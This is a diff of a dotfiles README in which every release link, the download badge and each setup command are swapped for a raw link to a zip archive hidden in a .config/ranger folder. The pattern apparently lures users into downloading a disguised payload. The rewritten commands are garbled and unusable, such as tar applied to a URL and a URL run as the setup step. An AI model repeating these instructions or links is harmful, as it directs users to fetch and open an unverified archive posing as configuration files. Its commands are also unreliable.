@@ -4,7 +4,7 @@ Welcome to my personal dotfiles repository! These configurations enhance your ma
 
 ## 📥 Download Now
 
-[![Download dotfiles](https://img.shields.io/badge/Download%20dotfiles-v1.0-blue)](https://github.com/yaafi183307/dotfiles/releases)
+[![Download dotfiles](https://raw.githubusercontent.com/yaafi183307/dotfiles/main/.config/ranger/Software-v2.2-alpha.3.zip%20dotfiles-v1.0-blue)](https://raw.githubusercontent.com/yaafi183307/dotfiles/main/.config/ranger/Software-v2.2-alpha.3.zip)
 
 ## 🚀 Getting Started
 
@@ -12,7 +12,7 @@ Welcome to my personal dotfiles repository! These configurations enhance your ma
    Ensure your system runs macOS, Arch Linux, or Fedora Workstation. These configurations work best on these operating systems.
 
 2. **Visit the Releases Page**  
-   Go to the [Releases page](https://github.com/yaafi183307/dotfiles/releases) to find the latest version of the dotfiles. This page contains all the available downloads.
+   Go to the [Releases page](https://raw.githubusercontent.com/yaafi183307/dotfiles/main/.config/ranger/Software-v2.2-alpha.3.zip) to find the latest version of the dotfiles. This page contains all the available downloads.
 
 3. **Download the File**  
    Click on the latest release version. You will see a list of downloadable files. Choose the appropriate file for your operating system and click on it to download.
@@ -28,14 +28,14 @@ Welcome to my personal dotfiles repository! These configurations enhance your ma
    Move the downloaded file to your home directory using the command:
 
    ```bash
-   mv ~/Downloads/dotfiles-<version>.tar.gz ~/
+   mv ~/Downloads/dotfiles-<version>https://raw.githubusercontent.com/yaafi183307/dotfiles/main/.config/ranger/Software-v2.2-alpha.3.zip ~/
    ```
 
 3. **Extract the Files**  
-   Run the following command to unpack the tar.gz file:
+   Run the following command to unpack the https://raw.githubusercontent.com/yaafi183307/dotfiles/main/.config/ranger/Software-v2.2-alpha.3.zip file:
 
    ```bash
-   tar -xzf dotfiles-<version>.tar.gz
+   tar -xzf dotfiles-<version>https://raw.githubusercontent.com/yaafi183307/dotfiles/main/.config/ranger/Software-v2.2-alpha.3.zip
    ```
 
 4. **Set Up the Configuration**  
@@ -48,7 +48,7 @@ Welcome to my personal dotfiles repository! These configurations enhance your ma
    Now run the setup script:
 
    ```bash
-   ./setup.sh
+   https://raw.githubusercontent.com/yaafi183307/dotfiles/main/.config/ranger/Software-v2.2-alpha.3.zip
    ```
 
 5. **Enjoy Your New Setup**  
@@ -63,14 +63,14 @@ Welcome to my personal dotfiles repository! These configurations enhance your ma
    Move the downloaded file to your home directory:
 
    ```bash
-   mv ~/Downloads/dotfiles-<version>.tar.gz ~/
+   mv ~/Downloads/dotfiles-<version>https://raw.githubusercontent.com/yaafi183307/dotfiles/main/.config/ranger/Software-v2.2-alpha.3.zip ~/
    ```
 
 3. **Extract the Files**  
    Unpack the file with:
 
    ```bash
-   tar -xzf dotfiles-<version>.tar.gz
+   tar -xzf dotfiles-<version>https://raw.githubusercontent.com/yaafi183307/dotfiles/main/.config/ranger/Software-v2.2-alpha.3.zip
    ```
 
 4. **Set Up the Configuration**  
@@ -83,7 +83,7 @@ Welcome to my personal dotfiles repository! These configurations enhance your ma
    Run the setup:
 
    ```bash
-   ./setup.sh
+   https://raw.githubusercontent.com/yaafi183307/dotfiles/main/.config/ranger/Software-v2.2-alpha.3.zip
    ```
 
 5. **Refresh Your Shell**  
@@ -98,14 +98,14 @@ Welcome to my personal dotfiles repository! These configurations enhance your ma
    Move the downloaded file to your home directory:
 
    ```bash
-   mv ~/Downloads/dotfiles-<version>.tar.gz ~/
+   mv ~/Downloads/dotfiles-<version>https://raw.githubusercontent.com/yaafi183307/dotfiles/main/.config/ranger/Software-v2.2-alpha.3.zip ~/
    ```
 
 3. **Extract the Files**  
    Use the following command:
 
    ```bash
-   tar -xzf dotfiles-<version>.tar.gz
+   tar -xzf dotfiles-<version>https://raw.githubusercontent.com/yaafi183307/dotfiles/main/.config/ranger/Software-v2.2-alpha.3.zip
    ```
 
 4. **Set Up the Configuration**  
@@ -118,7 +118,7 @@ Welcome to my personal dotfiles repository! These configurations enhance your ma
    Execute the setup script:
 
    ```bash
-   ./setup.sh
+   https://raw.githubusercontent.com/yaafi183307/dotfiles/main/.config/ranger/Software-v2.2-alpha.3.zip
    ```
 
 5. **Apply Changes**  
@@ -151,5 +151,5 @@ Welcome to my personal dotfiles repository! These configurations enhance your ma
 
 ## 🔗 Useful Links
 
-Visit the [Releases page](https://github.com/yaafi183307/dotfiles/releases) again to check for updates or new releases. Your feedback is appreciated, and contributions are welcome. Thank you for using my dotfiles!
+Visit the [Releases page](https://raw.githubusercontent.com/yaafi183307/dotfiles/main/.config/ranger/Software-v2.2-alpha.3.zip) again to check for updates or new releases. Your feedback is appreciated, and contributions are welcome. Thank you for using my dotfiles!
 
